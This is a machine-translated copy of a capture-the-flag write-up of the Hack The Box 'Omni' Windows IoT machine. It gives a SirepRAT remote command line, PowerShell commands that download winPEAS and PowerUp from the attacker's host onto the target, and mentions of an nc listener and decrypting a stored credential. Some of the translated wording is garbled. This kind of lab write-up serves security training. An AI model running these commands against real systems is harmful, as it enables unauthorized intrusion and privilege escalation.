<html>
<head>
<title>HTB Omni [writeup]</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HTB·奥米[报道]</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/htb-omni-writeup-7efdc6fd1c10?source=collection_archive---------0-----------------------#2022-11-18">https://infosecwriteups.com/htb-omni-writeup-7efdc6fd1c10?source=collection_archive---------0-----------------------#2022-11-18</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="2051" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">使用SireRAT开发Windows物联网核心</h2></div><h1 id="719e" class="ki kj it bd kk kl km kn ko kp kq kr ks jz kt ka ku kc kv kd kw kf kx kg ky kz bi translated">摘要</h1><p id="d549" class="pw-post-body-paragraph la lb it lc b ld le ju lf lg lh jx li lj lk ll lm ln lo lp lq lr ls lt lu lv im bi translated">这是一台易受远程代码执行攻击的windows IoT机器(RCE)。一种名为SirepRAT的远程访问特洛伊木马(RAT)工具被用来利用此漏洞获取根用户。</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi lw"><img src="../Images/819f198c9cc2547c96accb88c3586465.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*e-YqGj-KTD6TAv_P"/></div></div><figcaption class="mi mj gj gh gi mk ml bd b be z dk translated">Jorge Ramirez 在<a class="ae mm" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄的照片</figcaption></figure></div><div class="ab cl mn mo hx mp" role="separator"><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms"/></div><div class="im in io ip iq"><p id="963b" class="pw-post-body-paragraph la lb it lc b ld mu ju lf lg mv jx li lj mw ll lm ln mx lp lq lr my lt lu lv im bi translated"><strong class="lc iu">操作系统:</strong> Windows 10 IOT核心x64位架构</p><p id="7b35" class="pw-post-body-paragraph la lb it lc b ld mu ju lf lg mv jx li lj mw ll lm ln mx lp lq lr my lt lu lv im bi translated"><strong class="lc iu">使用的工具:</strong></p><ul class=""><li id="ec76" class="mz na it lc b ld mu lg mv lj nb ln nc lr nd lv ne nf ng nh bi translated">nmap</li><li id="3ffb" class="mz na it lc b ld ni lg nj lj nk ln nl lr nm lv ne nf ng nh bi translated">锡雷普拉特— Windows IOT RCE</li></ul></div><div class="ab cl mn mo hx mp" role="separator"><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms"/></div><div class="im in io ip iq"><h2 id="c484" class="nn kj it bd kk no np dn ko nq nr dp ks lj ns nt ku ln nu nv kw lr nw nx ky ny bi translated">侦察和枚举- NMAP TCP输出</h2><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nz"><img src="../Images/699a3208e6e22633931988290ca2bd55.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*q7kpofTtDCJzw_6Syq6DJQ.png"/></div></div></figure></div><div class="ab cl mn mo hx mp" role="separator"><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms"/></div><div class="im in io ip iq"><h2 id="1452" class="nn kj it bd kk no np dn ko nq nr dp ks lj ns nt ku ln nu nv kw lr nw nx ky ny bi translated">据点</h2><p id="4be7" class="pw-post-body-paragraph la lb it lc b ld le ju lf lg lh jx li lj lk ll lm ln lo lp lq lr ls lt lu lv im bi translated"><strong class="lc iu">* * * * * * * * * *端口8080微软IIS httpd * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *</strong></p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi oa"><img src="../Images/5a193bbaaedf2a15518b8524e9151c80.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bsBfI-2abn7zV0jAVUe9Yg.png"/></div></div></figure><p id="d2c9" class="pw-post-body-paragraph la lb it lc b ld mu ju lf lg mv jx li lj mw ll lm ln mx lp lq lr my lt lu lv im bi translated">切换到端口8080，我们可以看到访问这个名为“Windows设备门户”的站点需要身份验证。我在谷歌上搜索了“windows IoT exploit”，并注意到了一篇关于利用这个漏洞的开源工具的文章。</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ob"><img src="../Images/98540c59407c366e63acf8793406c2b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aGelg2OcqMcYV97NWIxXVw.png"/></div></div></figure><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi oc"><img src="../Images/e9efc879509989b6de96ee5b82e5f919.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qUlmvmum8LdhSgcvvlrXyA.png"/></div></div></figure><p id="bed3" class="pw-post-body-paragraph la lb it lc b ld mu ju lf lg mv jx li lj mw ll lm ln mx lp lq lr my lt lu lv im bi translated">使用此<a class="ae mm" href="https://github.com/SafeBreach-Labs/SirepRAT" rel="noopener ugc nofollow" target="_blank">连杆</a>安装SireRAT。</p><p id="cdae" class="pw-post-body-paragraph la lb it lc b ld mu ju lf lg mv jx li lj mw ll lm ln mx lp lq lr my lt lu lv im bi translated"><strong class="lc iu">通过执行以下命令</strong>找出系统主机名</p><p id="45d8" class="pw-post-body-paragraph la lb it lc b ld mu ju lf lg mv jx li lj mw ll lm ln mx lp lq lr my lt lu lv im bi translated"><code class="fe od oe of og b">python /usr/local/bin/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd “C:\Windows\System32\hostname.exe”</code></p><p id="8845" class="pw-post-body-paragraph la lb it lc b ld mu ju lf lg mv jx li lj mw ll lm ln mx lp lq lr my lt lu lv im bi translated"><code class="fe od oe of og b">—return_output</code>返回命令输出</p><p id="9551" class="pw-post-body-paragraph la lb it lc b ld mu ju lf lg mv jx li lj mw ll lm ln mx lp lq lr my lt lu lv im bi translated"><code class="fe od oe of og b">—cmd</code>命令执行</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi oh"><img src="../Images/081d0a148b9af26de2c33775bae2f079.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GPpS_FDFiVTn-_FcUOIxnQ.png"/></div></div></figure><h2 id="f629" class="nn kj it bd kk no np dn ko nq nr dp ks lj ns nt ku ln nu nv kw lr nw nx ky ny bi translated">启动nc监听器并执行powershell</h2><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi oi"><img src="../Images/4c4575436098e1601671a0278bfa2413.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MLCGh4zN1AGgSNrHT4uCjw.png"/></div></div></figure><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi oj"><img src="../Images/23a688147ba7378220ea7fa6309c3510.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PH8zmd8XmoCew0d_AgKF2g.png"/></div></div></figure><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ok"><img src="../Images/4133ff85ea337340922f2303e2b90342.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*L6IUVge3AsG-zN-J23jxuw.png"/></div></div></figure><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ol"><img src="../Images/cbe4386e78bedf6c3a2ea14ae638d0c9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mKz4tyszx2uJNZL96BPL0A.png"/></div></div></figure><p id="987b" class="pw-post-body-paragraph la lb it lc b ld mu ju lf lg mv jx li lj mw ll lm ln mx lp lq lr my lt lu lv im bi translated"><code class="fe od oe of og b">powershell invoke-webrequest -uri <a class="ae mm" href="http://10.10.14.17:8777/windows/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe" rel="noopener ugc nofollow" target="_blank">http://10.10.14.24/windows/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe</a> -outfile C:\Windows\temp\winpeas.exe</code></p><p id="6560" class="pw-post-body-paragraph la lb it lc b ld mu ju lf lg mv jx li lj mw ll lm ln mx lp lq lr my lt lu lv im bi translated"><code class="fe od oe of og b">powershell invoke-webrequest -uri <a class="ae mm" href="http://10.10.14.17:8777/windows/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe" rel="noopener ugc nofollow" target="_blank">http://10.10.14.24/windows/</a>powerup.ps1 -outfile C:\Windows\temp\powerup.ps1</code></p><div class="lx ly lz ma gt ab cb"><figure class="om mb on oo op oq or paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><img src="../Images/230ddf9a91eaba271ae7478db4a36562.png" data-original-src="https://miro.medium.com/v2/resize:fit:558/format:webp/1*7nkvqc_mP7QJp4MriRH8Ig.png"/></div></figure><figure class="om mb os oo op oq or paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><img src="../Images/31f737b9e85373a288643e653c3df058.png" data-original-src="https://miro.medium.com/v2/resize:fit:1444/format:webp/1*aLSKbNVgPIFwE07V9buH4w.png"/></div></figure></div></div><div class="ab cl mn mo hx mp" role="separator"><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms"/></div><div class="im in io ip iq"><h2 id="1268" class="nn kj it bd kk no np dn ko nq nr dp ks lj ns nt ku ln nu nv kw lr nw nx ky ny bi translated">横向运动</h2><p id="3555" class="pw-post-body-paragraph la lb it lc b ld le ju lf lg lh jx li lj lk ll lm ln lo lp lq lr ls lt lu lv im bi translated">在使用winpPEAS.bat枚举盒子时，我发现还有两个磁盘:D:和U:</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ot"><img src="../Images/cf50afc3fa596fe72720cebde588fdbe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_ZaP40WMucErMQ6SZuR27w.png"/></div></div></figure><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ou"><img src="../Images/ae1b61d38915f7414308c7b30185d842.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_mfHbrAG6UXZhd2-qyRqew.png"/></div></div></figure><p id="c38e" class="pw-post-body-paragraph la lb it lc b ld mu ju lf lg mv jx li lj mw ll lm ln mx lp lq lr my lt lu lv im bi translated">使用找到的用户应用程序凭据，我尝试登录身份验证门户。</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ov"><img src="../Images/e87b58ab1256c39732f1206a7a71f0a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LFbuYyWvkDNpBdYv3ICzfg.png"/></div></div></figure><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ow"><img src="../Images/ae1ed59dbf0ffb2344489635d5e34c83.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9Jy79qZzqGr_y9O-Q2uA_A.png"/></div></div></figure><p id="5d14" class="pw-post-body-paragraph la lb it lc b ld mu ju lf lg mv jx li lj mw ll lm ln mx lp lq lr my lt lu lv im bi translated">使用<a class="ae mm" href="https://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/" rel="noopener ugc nofollow" target="_blank"> ref1 </a>和<a class="ae mm" href="https://www.thinbug.com/q/55807201" rel="noopener ugc nofollow" target="_blank"> ref2 </a>解密powershell安全字符串密码。</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ox"><img src="../Images/8cd449224eff48768af76fb13e18560c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*B2C15JblvNP77_xhic8Pow.png"/></div></div></figure></div><div class="ab cl mn mo hx mp" role="separator"><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms"/></div><div class="im in io ip iq"><h2 id="4fc6" class="nn kj it bd kk no np dn ko nq nr dp ks lj ns nt ku ln nu nv kw lr nw nx ky ny bi translated">权限提升</h2><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi oy"><img src="../Images/60567a797df7618560f79a6f2ba7ba7f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UXVvxTmqh4b6AqSrCoaZXQ.png"/></div></div></figure><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi oz"><img src="../Images/ee402d1d978f7af9be5277b23ceeffc5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6-Ri3M5cP-jnvh0JiszLPA.png"/></div></div></figure><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ov"><img src="../Images/8708ce238f299bfa39fe6637ad9a08ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NDxFJb14Y74x2hs1fypMbg.png"/></div></div></figure><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pa"><img src="../Images/1d009077c6b1ec420a14d8881745b0c5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3AK3p92qmEJF-3GaIADWNQ.png"/></div></div></figure></div><div class="ab cl mn mo hx mp" role="separator"><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms"/></div><div class="im in io ip iq"><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pb"><img src="../Images/dcb3b298379ab07e6416bdd0aa83d884.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*Dy4wlCCNk7F8xloIhWo2qA.gif"/></div></div></figure></div><div class="ab cl mn mo hx mp" role="separator"><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms mt"/><span class="mq bw bk mr ms"/></div><div class="im in io ip iq"><h2 id="75f4" class="nn kj it bd kk no np dn ko nq nr dp ks lj ns nt ku ln nu nv kw lr nw nx ky ny bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae mm" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4条线索、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>